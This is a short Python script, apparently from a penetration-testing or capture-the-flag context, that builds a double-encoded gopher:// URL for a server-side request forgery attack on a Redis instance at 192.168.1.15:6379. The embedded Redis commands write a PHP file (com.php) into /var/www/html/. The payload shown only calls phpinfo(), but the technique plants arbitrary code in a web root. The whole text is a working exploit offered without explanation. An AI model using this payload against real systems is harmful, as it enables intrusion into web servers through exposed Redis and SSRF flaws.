import urllib.parse
s="""set name "<?php phpinfo(); ?>" 
config set dir /var/www/html/
config set dbfilename com.php
save
quit
"""
s=urllib.parse.quote("gopher://192.168.1.15:6379/_"+urllib.parse.quote(s,safe='').replace('%0A','%0D%0A'))
print(s) 
